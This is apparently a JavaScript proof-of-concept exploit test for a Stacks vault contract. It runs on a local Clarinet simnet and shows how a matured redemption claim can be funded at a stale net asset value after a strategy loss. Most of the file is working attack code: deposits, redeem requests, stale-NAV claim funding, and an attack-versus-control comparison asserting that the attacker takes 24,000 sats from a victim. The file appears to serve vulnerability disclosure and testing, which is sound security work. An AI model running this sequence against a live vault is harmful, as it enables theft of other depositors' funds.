import assert from 'node:assert/strict';
import { initSimnet } from '@stacks/clarinet-sdk';
import { Cl, cvToString } from '@stacks/transactions';

const BASE = 100_000_000n;
const ATTACKER_SHARES = 40_000_000n;
const VICTIM_SHARES = 60_000_000n;
const STRATEGY_CAPITAL = 50_000_000n;
const RF_BUFFER = 240_000n;      // 24 bps
const GROSS_LOSS = 300_000n;     // 30 bps
const NET_HOLDER_LOSS = 60_000n; // 6 bps after RF
const EXPECTED_ATTACKER_FAIR = 39_976_000n;
const EXPECTED_VICTIM_FAIR = 59_964_000n;
const EXPECTED_ATTACKER_STALE = 40_000_000n;
const EXPECTED_VICTIM_ATTACK = 59_940_000n;
const SHIFT = 24_000n;
const SBTC = 'SM3VDXK3WZZSA84XXFKAFAF15NNZX32CTSG82JFQ4.sbtc-token';

async function runCase(mode) {
  const simnet = await initSimnet('tests/security/stale-nav/Clarinet.toml');
  const accounts = simnet.getAccounts();
  const deployer = accounts.get('deployer');
  const rewarder = accounts.get('wallet_1');
  const attacker = accounts.get('wallet_2');
  const victim = accounts.get('wallet_3');
  if (!deployer || !rewarder || !attacker || !victim) throw new Error('missing accounts');

  const c = n => `${deployer}.${n}`;
  const text = r => cvToString(r.result);
  const pub = (n, fn, args, sender) => simnet.callPublicFn(c(n), fn, args, sender);
  const ro = (n, fn, args = [], sender = deployer) => simnet.callReadOnlyFn(c(n), fn, args, sender);
  const expect = (label, r, wanted) => {
    const got = text(r);
    console.log(`[${mode}] ${label}: ${got}`);
    assert.equal(got, wanted, `[${mode}] ${label}: expected ${wanted}, got ${got}`);
  };
  const u = r => {
    const m = text(r).match(/(?:\(ok )?u(\d+)\)?/);
    if (!m) throw new Error(text(r));
    return BigInt(m[1]);
  };
  const sbtc = who => u(simnet.callReadOnlyFn(SBTC, 'get-balance-available', [Cl.principal(who)], deployer));
  const hbtc = who => u(ro('token-hbtc', 'get-balance', [Cl.principal(who)], who));
  const requestRole = (fn, address) => expect(fn, pub('hq-hbtc', fn, [Cl.principal(address), Cl.bool(true)], deployer), '(ok true)');
  const confirmRole = (fn, address) => expect(fn, pub('hq-hbtc', fn, [Cl.principal(address)], deployer), '(ok true)');

  const state = c('state');
  const vault = c('vault');
  const controller = c('controller-hbtc');
  const reserve = c('reserve');
  const helper = c('strategy-loss-helper');
  const reserveFund = c('reserve-fund');

  for (const address of [state, vault, controller, reserve, helper]) requestRole('request-protocol-update', address);
  requestRole('request-rewarder-update', rewarder);
  expect('request sBTC asset', pub('state', 'request-asset-add', [Cl.principal(SBTC), Cl.buffer(new Uint8Array(32)), Cl.uint(8), Cl.uint(500), Cl.bool(false)], deployer), '(ok true)');
  simnet.mineEmptyBlocks(200);
  for (const address of [state, vault, controller, reserve, helper]) confirmRole('confirm-protocol-request', address);
  confirmRole('confirm-rewarder-request', rewarder);
  expect('confirm sBTC asset', pub('state', 'confirm-asset-request', [Cl.principal(SBTC)], deployer), '(ok true)');
  expect('deposit cap', pub('state', 'set-deposit-cap', [Cl.uint(2n * BASE)], deployer), '(ok true)');
  expect('max-reward production default', ro('state', 'get-max-reward'), 'u5');
  expect('max-deviation production default', ro('state', 'get-max-deviation'), 'u7');

  for (const [who, amount] of [[attacker, ATTACKER_SHARES], [victim, VICTIM_SHARES], [reserveFund, RF_BUFFER]]) {
    const r = simnet.callPrivateFn(SBTC, 'protocol-mint-many-iter', [Cl.tuple({ amount: Cl.uint(amount), recipient: Cl.principal(who) })], deployer);
    assert.equal(text(r), '(ok true)');
  }

  expect('attacker deposit', pub('vault', 'deposit', [Cl.uint(ATTACKER_SHARES), Cl.none()], attacker), '(ok u40000000)');
  expect('victim deposit', pub('vault', 'deposit', [Cl.uint(VICTIM_SHARES), Cl.none()], victim), '(ok u60000000)');
  expect('attacker request standard redeem', pub('vault', 'request-redeem', [Cl.uint(ATTACKER_SHARES), Cl.bool(false)], attacker), '(ok u1)');
  simnet.mineEmptyBlocks(500);
  assert.equal(hbtc(victim), VICTIM_SHARES);

  expect('deploy strategy capital', pub('strategy-loss-helper', 'pull-from-reserve', [Cl.uint(STRATEGY_CAPITAL)], deployer), '(ok true)');
  expect('fresh NAV log', pub('controller-hbtc', 'log-reward', [Cl.uint(0), Cl.bool(true)], rewarder), '(ok true)');
  const freshLogTs = u(ro('state', 'get-last-log-ts'));
  expect('PR137 says fresh before loss', ro('pr137-shadow', 'is-sp-stale', [Cl.uint(freshLogTs)]), 'false');
  expect('realize external strategy loss', pub('strategy-loss-helper', 'realize-loss', [Cl.uint(GROSS_LOSS), Cl.principal(deployer)], deployer), '(ok true)');
  expect('PR137 still says fresh after loss', ro('pr137-shadow', 'is-sp-stale', [Cl.uint(freshLogTs)]), 'false');
  expect('production loss accounting blocked', pub('controller-hbtc', 'log-reward', [Cl.uint(GROSS_LOSS), Cl.bool(false)], rewarder), '(err u102009)');

  let attackerPayout;
  let victimPayout;

  if (mode === 'ATTACK') {
    const beforeAttacker = sbtc(attacker);
    expect('fund attacker at stale NAV', pub('vault', 'fund-claim', [Cl.uint(1)], attacker), '(ok u40000000)');
    expect('redeem attacker at stale NAV', pub('vault', 'redeem', [Cl.uint(1)], attacker), '(ok u40000000)');
    attackerPayout = sbtc(attacker) - beforeAttacker;

    // The stale exit shrinks the accounting denominator, so recovery now needs
    // both the 50 bps max-reward and 10 bps max-deviation changes.
    expect('request max-reward 50', pub('state', 'request-max-reward-update', [Cl.uint(50)], deployer), '(ok true)');
    simnet.mineEmptyBlocks(200);
    expect('confirm max-reward 50', pub('state', 'confirm-max-reward-request', [], deployer), '(ok true)');
    expect('recovery still blocked by deviation', pub('controller-hbtc', 'log-reward', [Cl.uint(GROSS_LOSS), Cl.bool(false)], rewarder), '(err u102014)');
    expect('request max-deviation 10', pub('state', 'request-max-deviation-update', [Cl.uint(10)], deployer), '(ok true)');
    simnet.mineEmptyBlocks(200);
    expect('confirm max-deviation 10', pub('state', 'confirm-max-deviation-request', [], deployer), '(ok true)');
    expect('reconcile loss', pub('controller-hbtc', 'log-reward', [Cl.uint(GROSS_LOSS), Cl.bool(false)], rewarder), '(ok true)');
  } else {
    // Counterfactual control: nobody is allowed to fund the stale claim. Only the
    // minimum governance change required to admit the same 30 bps gross loss is made.
    // RF then leaves 6 bps net holder loss, which is within max-deviation=7 bps.
    expect('request max-reward 30', pub('state', 'request-max-reward-update', [Cl.uint(30)], deployer), '(ok true)');
    simnet.mineEmptyBlocks(200);
    expect('confirm max-reward 30', pub('state', 'confirm-max-reward-request', [], deployer), '(ok true)');
    expect('reconcile before claim funding', pub('controller-hbtc', 'log-reward', [Cl.uint(GROSS_LOSS), Cl.bool(false)], rewarder), '(ok true)');

    const beforeAttacker = sbtc(attacker);
    expect('fund attacker at corrected NAV', pub('vault', 'fund-claim', [Cl.uint(1)], attacker), '(ok u39976000)');
    expect('redeem attacker at corrected NAV', pub('vault', 'redeem', [Cl.uint(1)], attacker), '(ok u39976000)');
    attackerPayout = sbtc(attacker) - beforeAttacker;
  }

  // Return all surviving strategy capital so the remaining holder can perform a
  // real token redemption. This changes only physical liquidity location, not NAV.
  expect('return surviving strategy capital', pub('strategy-loss-helper', 'return-to-reserve', [Cl.uint(STRATEGY_CAPITAL - GROSS_LOSS)], deployer), '(ok true)');

  expect('victim request redeem', pub('vault', 'request-redeem', [Cl.uint(VICTIM_SHARES), Cl.bool(false)], victim), '(ok u2)');
  simnet.mineEmptyBlocks(500);
  const beforeVictim = sbtc(victim);
  const expectedVictim = mode === 'ATTACK' ? '(ok u59940000)' : '(ok u59964000)';
  expect('fund victim at final NAV', pub('vault', 'fund-claim', [Cl.uint(2)], victim), expectedVictim);
  expect('victim actual token redeem', pub('vault', 'redeem', [Cl.uint(2)], victim), expectedVictim);
  victimPayout = sbtc(victim) - beforeVictim;

  assert.equal(hbtc(victim), 0n);
  assert.equal(sbtc(reserve), 0n);

  return { attackerPayout, victimPayout, totalUserPayout: attackerPayout + victimPayout };
}

console.log('=== CRITICAL IMPACT A/B: actual token payouts, not mark-to-market ===');
const attack = await runCase('ATTACK');
const control = await runCase('CONTROL');

console.log('\n=== TOKEN-LEVEL RESULT ===');
console.log(`attack attacker payout:  ${attack.attackerPayout}`);
console.log(`control attacker payout: ${control.attackerPayout}`);
console.log(`attacker excess:         ${attack.attackerPayout - control.attackerPayout}`);
console.log(`attack victim payout:    ${attack.victimPayout}`);
console.log(`control victim payout:   ${control.victimPayout}`);
console.log(`victim shortfall:        ${control.victimPayout - attack.victimPayout}`);
console.log(`attack total payouts:    ${attack.totalUserPayout}`);
console.log(`control total payouts:   ${control.totalUserPayout}`);

assert.equal(attack.attackerPayout, EXPECTED_ATTACKER_STALE);
assert.equal(control.attackerPayout, EXPECTED_ATTACKER_FAIR);
assert.equal(attack.victimPayout, EXPECTED_VICTIM_ATTACK);
assert.equal(control.victimPayout, EXPECTED_VICTIM_FAIR);
assert.equal(attack.attackerPayout - control.attackerPayout, SHIFT);
assert.equal(control.victimPayout - attack.victimPayout, SHIFT);
assert.equal(attack.totalUserPayout, control.totalUserPayout);
assert.equal(attack.totalUserPayout, BASE - NET_HOLDER_LOSS);

console.log('PASS CRITICAL DIRECT-PAYOUT A/B: the same vault, same users, same 30bps realized strategy loss, same 24bps Reserve Fund, and same final total user payout produce different wallet-level allocations solely because the matured claimant is allowed to fund at stale NAV. The attacker receives exactly 24,000 sats more sBTC than in the correctly reconciled control, while the victim later receives exactly 24,000 sats less actual sBTC. Total user payouts are identical in both executions, proving a zero-sum transfer of user principal rather than a valuation artifact, fee effect, rounding effect, or protocol-created value.');
